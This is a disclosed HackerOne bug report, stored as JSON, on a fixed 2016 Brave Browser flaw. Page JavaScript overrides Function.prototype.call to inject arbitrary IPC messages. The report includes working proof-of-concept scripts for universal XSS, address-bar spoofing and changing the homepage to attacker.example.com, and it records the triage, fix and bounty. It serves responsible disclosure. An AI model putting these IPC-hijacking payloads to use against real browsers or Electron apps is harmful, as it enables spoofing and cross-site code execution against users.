@@ -1,0 +1,467 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-08-18T08:42:52.419Z", 
+    "voters": [
+        "spam404", 
+        "pekafat", 
+        "eveeez", 
+        "mygf", 
+        "apapedulimu", 
+        "spetr0x", 
+        "cryptographer", 
+        "amjamjamj", 
+        "jatacheers"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "300.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 187542, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-09-18T18:15:17.846Z", 
+    "vulnerability_information": "## Summary:\nI found that Brave Browser allows to overwrite the internal js code from the user js code.\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. \n\n## Steps to Reproduce:\n\n1 .  An attacker overwrites `Function.prototype.call`, like this:\n\n```\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n        e[1]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n    }\n    return this.apply(e);\n}\n```\n2 .  An attacker calls `alert()`.\n\n3 .  Brave's `alert()` function calls `Function.prototype.call` in the internal code. At this time, the overwritten `Function.prototype.call` is used in the `alert` internal code.\n\n4 .  `Function.prototype.call` receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.\n\n## PoC:\n\nI'd like to show three PoCs:\n\n###UXSS PoC\n\n(If it goes well, you can see an alert dialog on google's domain.)\n```\n<script>\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"dispatch-action\";\n        e[1]='{\"actionType\":\"window-new-frame\",\"frameOpts\":{\"location\":\"https://www.google.com/ncr\"},\"openInForeground\":true}'\n    }\n    return this.apply(e);\n}\nalert();\n\nsetTimeout(function(){\n\tfor(var windowKey=0;windowKey<10000;windowKey++){\n\t\tFunction.prototype.call=function(e){\n\t\t\tif(e && e[0] && e[0]==\"window-alert\"){\n\t\t\t\te[0]=\"dispatch-action\";\n\t\t\t\te[1]=`{\"actionType\":\"window-set-url\",\"location\":\"javascript:alert('document.domain is: '+document.domain)\",\"key\":${windowKey}}`\n\t\t\t}\n\t\t\treturn this.apply(e);\n\t\t}\n\t\talert();\n\t}\n},3000);\n</script>\n```\n\n\n###Address Bar Spoofing PoC\n\n(If it goes well, you can see https://www.google.com/ in address bar.)\n```\n<script>\nFunction.prototype.call=function(e){\n\tif(e && e[0] && e[0]==\"window-alert\"){\n\t\te[0]=\"dispatch-action\";\n\t\te[1]='{\"actionType\":\"window-set-navbar-input\",\"location\":\"https://www.google.com/\"}';\n\t}\n\treturn this.apply(e);\n}\nalert();\n</script>\n```\n\n\n###Change browser settings PoC\n\n(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in `about:preferences`. )\n```\n<script>\nFunction.prototype.call=function(e){\n    if(e[0]&&e[0]==\"window-alert\"){\n        e[0]=\"dispatch-action\";\n        e[1]='{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}'\n    }\n    return this.apply(e);\n}\nalert();\n</script>\n```\n\nFYI, Electron has similar issues. I reported it to Electron team and they are working on it.\nCould you confirm this bug?\nThanks!", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "Brave Browser unexpectedly allows to send arbitrary IPC messages", 
+    "is_member_of_team?": null, 
+    "vote_count": 9, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$300", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:01:15.156Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:01:15.156Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "looking into it now", 
+            "markdown_message": "<p>looking into it now</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335418, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:08:11.489Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:08:11.489Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "@masatokinugawa it seems that this attack only works if the attacker code is running in the main renderer process, not the webview renderer process. The main renderer process is 'trusted' code (part of Brave browser itself), whereas webpages are loaded in webview processes.\n\ndo you have a PoC webpage that can do this attack when it is loaded in a Brave webview?\n\nif not, then this is not a vulnerability by itself.", 
+            "markdown_message": "<p><a href=\"/masatokinugawa\">@masatokinugawa</a> it seems that this attack only works if the attacker code is running in the main renderer process, not the webview renderer process. The main renderer process is &#39;trusted&#39; code (part of Brave browser itself), whereas webpages are loaded in webview processes.</p>\n\n<p>do you have a PoC webpage that can do this attack when it is loaded in a Brave webview?</p>\n\n<p>if not, then this is not a vulnerability by itself.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335426, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:18:54.849Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:18:54.849Z", 
+            "actor": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/268/82878d790b667d2bcc07423de5fe06ad0c126a9d_medium.jpg?1389890795"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "When you access the following page using Brave browser, your browser settings is changed. \nhttps://vulnerabledoma.in/brave/settings_change.html\n\nThis means that the attack is successful from Brave webview, right?", 
+            "markdown_message": "<p>When you access the following page using Brave browser, your browser settings is changed. <br>\n<a title=\"https://vulnerabledoma.in/brave/settings_change.html\" href=\"/redirect?signature=11c49e6d4779b24222391c16d56335ff08492a38&amp;url=https%3A%2F%2Fvulnerabledoma.in%2Fbrave%2Fsettings_change.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vulnerabledoma.in/brave/settings_change.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>This means that the attack is successful from Brave webview, right?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335438, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:23:07.594Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:27:37.564Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "@masatokinugawa thanks, looks like i was mistaken because i was trying out the PoC in an iframe", 
+            "markdown_message": "<p><a href=\"/masatokinugawa\">@masatokinugawa</a> thanks, looks like i was mistaken because i was trying out the PoC in an iframe</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335443, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:23:45.533Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:23:45.533Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 1335446, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:24:22.472Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:24:22.472Z", 
+            "actor": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/268/82878d790b667d2bcc07423de5fe06ad0c126a9d_medium.jpg?1389890795"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "Also, you can test address bar spoofing PoC: https://vulnerabledoma.in/brave/spoofing.html", 
+            "markdown_message": "<p>Also, you can test address bar spoofing PoC: <a title=\"https://vulnerabledoma.in/brave/spoofing.html\" href=\"/redirect?signature=04660353650350aa7c3f21d7df6cdaef107bee25&amp;url=https%3A%2F%2Fvulnerabledoma.in%2Fbrave%2Fspoofing.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vulnerabledoma.in/brave/spoofing.html</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335451, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:37:54.329Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:37:54.329Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "@masatokinugawa link to Electron issue? or is it not public?", 
+            "markdown_message": "<p><a href=\"/masatokinugawa\">@masatokinugawa</a> link to Electron issue? or is it not public?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335465, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T01:45:29.040Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T01:45:29.040Z", 
+            "actor": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/268/82878d790b667d2bcc07423de5fe06ad0c126a9d_medium.jpg?1389890795"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "sorry, it's not public yet", 
+            "markdown_message": "<p>sorry, it&#39;s not public yet</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335481, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-02T03:40:51.634Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T03:40:51.634Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "tentatively fixed by https://github.com/brave/electron/commit/03f05980afc480f29d3ea4bb3e7e0ebe0b62e428", 
+            "markdown_message": "<p>tentatively fixed by <a title=\"https://github.com/brave/electron/commit/03f05980afc480f29d3ea4bb3e7e0ebe0b62e428\" href=\"/redirect?signature=81dc8c11464e11129fac7a0d006df2c5ce01263f&amp;url=https%3A%2F%2Fgithub.com%2Fbrave%2Felectron%2Fcommit%2F03f05980afc480f29d3ea4bb3e7e0ebe0b62e428\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/brave/electron/commit/03f05980afc480f29d3ea4bb3e7e0ebe0b62e428</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1335555, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2016-12-02T03:49:26.564Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T03:49:26.564Z", 
+            "actor": {
+                "url": "/brave", 
+                "profile": {
+                    "name": "Brave Software"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/688/15cde82d31ab9da3f98b799d8c18c356706299e7_medium.png?1515887080"
+                }
+            }, 
+            "team_handle": "brave", 
+            "bounty_amount": "300.0", 
+            "collaborator": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1335558, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa"
+            }, 
+            "created_at": "2016-12-02T03:49:36.038Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-02T03:49:36.038Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1335559, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-18T08:42:52.460Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-18T08:42:52.460Z", 
+            "actor": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/268/82878d790b667d2bcc07423de5fe06ad0c126a9d_medium.jpg?1389890795"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3213542, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T17:52:01.886Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T17:52:01.886Z", 
+            "actor": {
+                "username": "masatokinugawa", 
+                "url": "/masatokinugawa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/268/82878d790b667d2bcc07423de5fe06ad0c126a9d_medium.jpg?1389890795"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "Hi, could you open this bug, #188561 and #188086?\nThanks!", 
+            "markdown_message": "<p>Hi, could you open this bug, <a href=\"/reports/188561\">#188561</a> and <a href=\"/reports/188086\">#188086</a>?<br>\nThanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3354689, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T18:15:17.985Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T18:15:17.985Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3354812, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T18:15:18.469Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T18:15:18.469Z", 
+            "actor": {
+                "username": "diracdeltas", 
+                "url": "/diracdeltas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/115/616/f7039f440746e1212b3aaa85ae1a145d6be2017c_medium.jpg?1476990192"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "brave", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3354813, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "masatokinugawa", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/masatokinugawa", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/268/a20e870aa92e1a47d135bfc5a5916c22aec01a7d_small.jpg?1389890795"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 58, 
+        "name": "Command Injection - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-09-18T18:15:18.396Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/187542", 
+    "created_at": "2016-12-02T00:41:45.053Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"summary\">Summary:</h2>\n\n<p>I found that Brave Browser allows to overwrite the internal js code from the user js code.<br>\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. </p>\n\n<h2 id=\"steps-to-reproduce\">Steps to Reproduce:</h2>\n\n<p>1 .  An attacker overwrites <code>Function.prototype.call</code>, like this:</p>\n<pre class=\"highlight plaintext\"><code>Function.prototype.call=function(e){\n    if(e[0]&amp;&amp;e[0]==&quot;window-alert&quot;){\n        e[0]=&quot;[ARBITRARY_IPC_MESSAGE_HERE]&quot;;\n        e[1]=&quot;[ARBITRARY_IPC_MESSAGE_HERE]&quot;;\n    }\n    return this.apply(e);\n}\n</code></pre>\n<p>2 .  An attacker calls <code>alert()</code>.</p>\n\n<p>3 .  Brave&#39;s <code>alert()</code> function calls <code>Function.prototype.call</code> in the internal code. At this time, the overwritten <code>Function.prototype.call</code> is used in the <code>alert</code> internal code.</p>\n\n<p>4 .  <code>Function.prototype.call</code> receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2&#39;s code. Thus, an attacker can send arbitrary IPC messages.</p>\n\n<h2 id=\"poc\">PoC:</h2>\n\n<p>I&#39;d like to show three PoCs:</p>\n\n<h3 id=\"uxss-poc\">UXSS PoC</h3>\n\n<p>(If it goes well, you can see an alert dialog on google&#39;s domain.)</p>\n<pre class=\"highlight plaintext\"><code>&lt;script&gt;\nFunction.prototype.call=function(e){\n    if(e[0]&amp;&amp;e[0]==&quot;window-alert&quot;){\n        e[0]=&quot;dispatch-action&quot;;\n        e[1]=&#39;{&quot;actionType&quot;:&quot;window-new-frame&quot;,&quot;frameOpts&quot;:{&quot;location&quot;:&quot;https://www.google.com/ncr&quot;},&quot;openInForeground&quot;:true}&#39;\n    }\n    return this.apply(e);\n}\nalert();\n\nsetTimeout(function(){\n    for(var windowKey=0;windowKey&lt;10000;windowKey++){\n        Function.prototype.call=function(e){\n            if(e &amp;&amp; e[0] &amp;&amp; e[0]==&quot;window-alert&quot;){\n                e[0]=&quot;dispatch-action&quot;;\n                e[1]=`{&quot;actionType&quot;:&quot;window-set-url&quot;,&quot;location&quot;:&quot;javascript:alert(&#39;document.domain is: &#39;+document.domain)&quot;,&quot;key&quot;:${windowKey}}`\n            }\n            return this.apply(e);\n        }\n        alert();\n    }\n},3000);\n&lt;/script&gt;\n</code></pre>\n<h3 id=\"address-bar-spoofing-poc\">Address Bar Spoofing PoC</h3>\n\n<p>(If it goes well, you can see <a title=\"https://www.google.com/\" href=\"/redirect?signature=71431681b03040615c75eb19d4398e55865b0f98&amp;url=https%3A%2F%2Fwww.google.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.google.com/</span><i class=\"icon-external-link\"></i></a> in address bar.)</p>\n<pre class=\"highlight plaintext\"><code>&lt;script&gt;\nFunction.prototype.call=function(e){\n    if(e &amp;&amp; e[0] &amp;&amp; e[0]==&quot;window-alert&quot;){\n        e[0]=&quot;dispatch-action&quot;;\n        e[1]=&#39;{&quot;actionType&quot;:&quot;window-set-navbar-input&quot;,&quot;location&quot;:&quot;https://www.google.com/&quot;}&#39;;\n    }\n    return this.apply(e);\n}\nalert();\n&lt;/script&gt;\n</code></pre>\n<h3 id=\"change-browser-settings-poc\">Change browser settings PoC</h3>\n\n<p>(If it goes well, your home page is changed to <a title=\"http://attacker.example.com/\" href=\"/redirect?signature=d5591b54d587f50ec4fab4118694f818bac6d7be&amp;url=http%3A%2F%2Fattacker.example.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://attacker.example.com/</span><i class=\"icon-external-link\"></i></a> . You can see it in <code>about:preferences</code>. )</p>\n<pre class=\"highlight plaintext\"><code>&lt;script&gt;\nFunction.prototype.call=function(e){\n    if(e[0]&amp;&amp;e[0]==&quot;window-alert&quot;){\n        e[0]=&quot;dispatch-action&quot;;\n        e[1]=&#39;{&quot;actionType&quot;:&quot;app-change-setting&quot;,&quot;key&quot;:&quot;general.homepage&quot;,&quot;value&quot;:&quot;http://attacker.example.com/&quot;}&#39;\n    }\n    return this.apply(e);\n}\nalert();\n&lt;/script&gt;\n</code></pre>\n<p>FYI, Electron has similar issues. I reported it to Electron team and they are working on it.<br>\nCould you confirm this bug?<br>\nThanks!</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://brave.com", 
+            "about": "", 
+            "twitter_handle": "brave", 
+            "name": "Brave Software"
+        }, 
+        "handle": "brave", 
+        "url": "https://hackerone.com/brave", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/688/10480fd4f209649dd8f2c2dff184cb0811255dd6_small.png?1515887080", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/688/15cde82d31ab9da3f98b799d8c18c356706299e7_medium.png?1515887080"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15688, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
